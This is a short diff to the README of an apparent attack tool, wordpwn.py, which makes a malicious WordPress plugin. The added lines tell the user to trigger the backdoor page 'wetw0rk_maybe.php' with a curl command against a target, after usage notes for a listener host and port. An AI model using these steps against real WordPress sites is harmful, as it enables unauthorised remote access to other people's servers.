@@ -16,3 +16,9 @@ Usage: wordpwn.py [LHOST] [LPORT] [HANDLER]
 Example: wordpwn.py 192.168.0.6 8888 Y
 ```
 
+Finally, visist the backdoor page `wetw0rk_maybe.php`.
+
+```
+curl http://[target]/wp-content/plugins/malicous-1/wetw0rk_maybe.php
+```
+
